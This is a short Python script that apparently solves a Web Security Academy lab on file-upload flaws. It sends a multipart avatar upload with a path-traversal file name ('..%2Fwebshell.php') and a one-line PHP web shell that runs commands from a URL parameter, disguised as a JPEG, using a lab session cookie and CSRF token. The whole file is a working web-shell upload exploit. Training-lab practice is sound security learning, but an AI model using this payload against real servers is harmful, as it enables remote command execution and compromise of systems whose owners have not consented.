import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('..%2Fwebshell.php', "<?php echo system($_GET['command']);", "image/jpeg"),
    'csrf': "FhroUd6QMBKkQn4kD3ys1y39XhlxqfnT",
    'user': "wiener"
})

headers = {
    "Cookie": "session=O5dG0ZYI2T11ayTYnLpy9Nl2o8DOvAzE",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0ac60067046ea179809762be007c0063.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)